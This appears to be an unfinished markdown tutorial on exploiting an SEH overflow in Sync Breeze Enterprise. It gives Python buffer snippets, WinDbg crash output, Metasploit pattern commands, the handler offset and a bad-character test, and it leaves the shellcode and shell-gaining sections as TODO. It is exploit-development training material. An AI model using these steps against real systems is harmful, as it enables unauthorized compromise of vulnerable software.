# SEH Overflow - Basic

## Table of Contents.
1. [Crash the application.](#crash)
2. [Analyse the crash.](#analyse)
3. [Inspecting the exception handler chain.](#exchain)
4. [Gaining Control of Exception Hanlder.](#GCEH)
5. [Detecting Bad Characters.](#BadChars)
6. [Finding a P/P/R Instruction.](#PPR)
7. [Short Jump.](#ShortJump)
8. [Locate the shellcode.](#LocateShellcode)
9. [Reach our shellcode.](#ReachShellcode)
10. [Get a Shell!](#Shell)

### Crash the application.<a href="crash"></a>

```python
...
size = 1000

inputBuffer = b"A" * size
...
```

### Analyse the crash.<a href="analyse"></a>

Insepcting at the time of the crash, i can see that thise time EIP isn't overwritten, but EAX register is. 

The crash occurs when executing the instruction "call dword..." because this address is not mapped in memory, in fact, executing it trigger an access violation.

```bash
0:010> g
(13d4.1280): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze Enterprise\bin\libpal.dll
eax=41414141 ebx=0073fa0c ecx=0073ff08 edx=0073f9c4 esi=0073ff08 edi=0073fb10
eip=00852a9d esp=0073f998 ebp=0073feb8 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
libpal!SCA_ConfigObj::Deserialize+0x1d:
00852a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=????????
```

At this step, the debugger intercepted a first chance exception.

First chance exception = A notification that an unexpected event occured during the program execution.

We can see too that few registers containt a chunk of our buffer.

```bash
0:009> dds esp L30
0073f998  0073fb10
0073f99c  0073f9ac
0073f9a0  00000000
0073f9a4  0073ff08
0073f9a8  0073fa0c
0073f9ac  00000000
0073f9b0  008666c2 libpal!SCA_NetMessage::Deserialize+0x82
...
0073fa04  000003e8
0073fa08  00000041
0073fa0c  41414141
0073fa10  41414141
0073fa14  41414141
0073fa18  41414141
...
```

Continue the execution flow.

```bash
0:009> g
(13d4.1280): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=41414141 edx=77e25b50 esi=00000000 edi=00000000
eip=41414141 esp=0073f440 ebp=0073f460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
41414141 ??              ???
```

This time we can see that we gain the control of the EIP, this happen because of SEH (<a href="https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms">Structured Exception Handler</a>).

### Inspecting the exception handler chain.<a href="exchain"></a>

Using the command "!exchain", we are able to inspect the exception handler chain at the moment of the crash.

```bash
0:010> g
(13d4.1280): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze Enterprise\bin\libpal.dll
eax=41414141 ebx=0073fa0c ecx=0073ff08 edx=0073f9c4 esi=0073ff08 edi=0073fb10
eip=00852a9d esp=0073f998 ebp=0073feb8 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
libpal!SCA_ConfigObj::Deserialize+0x1d:
00852a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=????????
0:009> !exchain
0073fe0c: libpal!md5_starts+149fb (008cdf5b)
0073ff44: 41414141
```

By doing so, we are able to see if we can overwrite the exact offset of exception handler.

### Gaining Control of Exception Handler.<a href="GCEH"></a>

As we do not control the stack in our scenario, we can't redirect the execution flow to it using an instruction like "JMP ESP" as we do in a vanilla stack overflow.

Generate a unique string to locate the exact offset of the exception handler.

```bash
┌──(v0lk3n㉿Omen-Laptop)-[~/SEH-Overflow-Basic]
└─$ msf-pattern_create -l 1000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac...
```

Update your PoC

```python
...
size = 1000

inputBuffer = b"<UniqueString>"
...
```

Run it and inspect the exception handler chain at the time of the crash.

```bash
0:009> g
(1178.1eac): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze Enterprise\bin\libpal.dll
eax=63413163 ebx=019dfa0c ecx=019dff08 edx=019df9c4 esi=019dff08 edi=019dfb10
eip=00912a9d esp=019df998 ebp=019dfeb8 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
libpal!SCA_ConfigObj::Deserialize+0x1d:
00912a9d ff5024          call    dword ptr [eax+24h]  ds:0023:63413187=????????

0:011> !exchain
019dfe0c: libpal!md5_starts+149fb (0098df5b)
019dff44: 33654132
Invalid exception stack at 65413165

```

Search for the exact offset.

```bash
┌──(v0lk3n㉿Omen-Laptop)-[~/SEH-Overflow-Basic]
└─$ msf-pattern_offset -q 33654132 -l 1000
[*] Exact match at offset 128
```

Now as for vanilla stack overflow, update the buffer of your PoC to send four B at this exact offset.

```python
...
size = 1000

Buffer = b"A" * 128
seh = b"B" * 4
shellcode = b"C" * (size - len(Buffer) - len(seh))
...
```

Run it, and verify that we got the control of Exception Handler.

```bash
0:009> g
(1b9c.1fe4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze Enterprise\bin\libpal.dll
eax=41414141 ebx=01a1fa0c ecx=01a1ff08 edx=01a1f9c4 esi=01a1ff08 edi=01a1fb10
eip=00862a9d esp=01a1f998 ebp=01a1feb8 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
libpal!SCA_ConfigObj::Deserialize+0x1d:
00862a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=????????

0:011> !exchain
01a1fe0c: libpal!md5_starts+149fb (008ddf5b)
01a1ff44: 42424242
Invalid exception stack at 41414141

0:011> g
(1b9c.1fe4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=42424242 edx=77e25b50 esi=00000000 edi=00000000
eip=42424242 esp=01a1f440 ebp=01a1f460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
42424242 ??              ???

```

As we can confirm, we successfully overwritted the exception handler with our four B. Continue the execution show that the EIP is overwritten with our four B as expected.

### Detecting Bad Characters.<a href="BadChars"></a>

```python
...
size = 1000

badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d"
    b"\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a"
    b"\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27"
    b"\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34"
    b"\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41"
    b"\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e"
    b"\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b"
    b"\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68"
    b"\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75"
    b"\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82"
    b"\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
    b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c"
    b"\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9"
    b"\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6"
    b"\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3"
    b"\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd"
    b"\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea"
    b"\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7"
    b"\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
...
```

Run the PoC with our bunch of hexadecimal characters. 

After causing the crash, continue the execution flow to reach EIP and locate our bunch of hexadecimal chars.

```bash

0:009> dds esp L8
0184f440  77e25b32 ntdll!ExecuteHandler2+0x26
0184f444  0184f540
0184f448  0184ff44 #<= Exception Handler
0184f44c  0184f55c
0184f450  0184f4cc
0184f454  0184fe0c
0184f458  77e25b50 ntdll!ExecuteHandler2+0x44
0184f45c  0184ff44

0:009> !exchain
0184f454: ntdll!ExecuteHandler2+44 (77e25b50)
0184fe0c: libpal!md5_starts+149fb (0090df5b)
0184ff44: 42424242
Invalid exception stack at 41414141

```

We can see that the address point to the exception handler, where we overwritten with our four B, read the memory of it.

```bash
0:009> db 0184ff44
0184ff44  41 41 41 41 42 42 42 42-01 00 00 00 ec 07 8c 00  AAAABBBB........
0184ff54  10 3e 8c 00 58 38 e1 00-72 40 8c 00 60 84 e1 00  .>..X8..r@..`...
0184ff64  58 38 e1 00 24 3e 8c 00-60 84 e1 00 10 3e 8c 00  X8..$>..`....>..
0184ff74  39 cf 42 76 58 38 e1 00-20 cf 42 76 dc ff 84 01  9.BvX8.. .Bv....
0184ff84  a5 26 da 77 58 38 e1 00-34 50 34 32 00 00 00 00  .&.wX8..4P42....
0184ff94  00 00 00 00 58 38 e1 00-00 00 00 00 00 00 00 00  ....X8..........
0184ffa4  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
0184ffb4  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
```

We can see that we locate our hexadecimal characters, and find that after the char "0x01" our buffer is truncated, meaning that "0x02" is a bad character.

Now that our characters are located, repeat the step above until found all bad characters.

### Finding a P/P/R Instructions.<a href="PPR"></a>

TODO

### Short Jump.<a href="ShortJump"></a>

TODO

### Locate the Shellcode.<a href="LocateShellcode"></a>

TODO

### Reach our Shellcode.<a href="ReachShellcode"></a>

TODO

### Get a Shell!<a href="Shell"></a>

TODO